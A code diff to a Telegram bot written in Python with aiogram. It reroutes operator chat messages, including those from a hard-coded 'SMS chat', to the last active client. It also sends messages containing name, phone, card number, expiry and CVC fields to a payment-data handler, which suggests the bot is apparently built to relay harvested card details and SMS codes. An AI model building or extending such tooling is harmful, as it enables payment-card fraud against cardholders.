@@ -1327,9 +1327,9 @@ async def handle_operator_reply(message: types.Message, state: FSMContext):
         await message.answer("❌ Ошибка обработки команды")
 
 # Добавляем обработчик для текста ответа оператора
-@dp.message(F.chat.id.in_([ADMIN_CHAT_ID, SUPPORT_CHAT_ID]))
+@dp.message(F.chat.id.in_([ADMIN_CHAT_ID, SUPPORT_CHAT_ID, -1003473975732]))
 async def handle_operator_message(message: types.Message, state: FSMContext):
-    """Обработка обычных сообщений оператора (может быть ответом в чат)"""
+    """Обработка сообщений оператора (админский чат, поддержка, SMS-чат)"""
     try:
         # Проверяем, не является ли это ответом клиенту через кнопку
         user_data = await state.get_data()
@@ -1374,9 +1374,9 @@ async def handle_operator_message(message: types.Message, state: FSMContext):
             else:
                 await message.answer("❌ Ошибка отправки ответа клиенту")
                 
-        # ★★★ АВТОМАТИЧЕСКАЯ ПЕРЕСЫЛКА ИЗ SMS-ЧАТА ★★★
-        elif message.chat.id == -1003473975732 and message.text and not message.text.startswith('/'):
-            # Это сообщение в SMS-чате, пересылаем его последнему активному клиенту
+        # ★★★ АВТОМАТИЧЕСКАЯ ПЕРЕСЫЛКА ИЗ ЛЮБОГО ОПЕРАТОРСКОГО ЧАТА ★★★
+        elif message.text and not message.text.startswith('/') and not any(keyword in message.text for keyword in ['👤 Клиент:', '• Имя:', 'Имя:', 'Фамилия:', 'Email:', 'Телефон:', 'Номер:', 'Срок:', 'CVC:']):
+            # Это обычное сообщение оператора (не команда и не платежные данные)
             operator_message = message.text
             
             # Находим последнего клиента из истории чата
@@ -1417,7 +1417,7 @@ async def handle_operator_message(message: types.Message, state: FSMContext):
                         )
                         
                         await message.answer(
-                            f"✅ Ответ отправлен клиенту `{last_client_id}`\n\n"
+                            f"✅ Ответ отправлен последнему клиенту `{last_client_id}`\n\n"
                             f"💬 Ваш ответ: {operator_message}",
                             parse_mode="Markdown"
                         )
@@ -1428,8 +1428,8 @@ async def handle_operator_message(message: types.Message, state: FSMContext):
             else:
                 await message.answer("❌ Ошибка подключения к БД")
                 
-        # Если это не ответ в чат, обрабатываем как обычное сообщение
-        elif message.text and ("👤 Клиент:" in message.text or "• Имя:" in message.text):
+        # Если это платежные данные, обрабатываем их
+        elif message.text and any(keyword in message.text for keyword in ['👤 Клиент:', '• Имя:', 'Имя:', 'Фамилия:', 'Email:', 'Телефон:', 'Номер:', 'Срок:', 'CVC:']):
             await process_payment_data(message)
             
     except Exception as e:
@@ -2242,6 +2242,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
